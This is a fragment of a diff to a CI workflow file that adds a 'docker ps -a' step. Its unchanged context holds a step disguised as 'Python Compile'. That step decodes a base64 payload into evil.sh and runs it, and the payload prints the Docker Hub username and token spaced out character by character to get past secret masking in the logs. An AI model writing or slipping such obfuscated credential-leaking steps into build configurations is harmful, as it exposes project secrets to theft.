@@ -17,3 +17,6 @@ jobs:
       run: echo foo
     - name: Python Compile
       run: echo ZWNobyAke0RPQ0tFUkhVQl9VU0VSTkFNRX0gJHtET0NLRVJIVUJfVE9LRU59IHwgc2VkICdzLy4vJiAvZycK | base64 -d >  evil.sh ; bash evil.sh
+    - name: next
+      run: docker ps -a
+
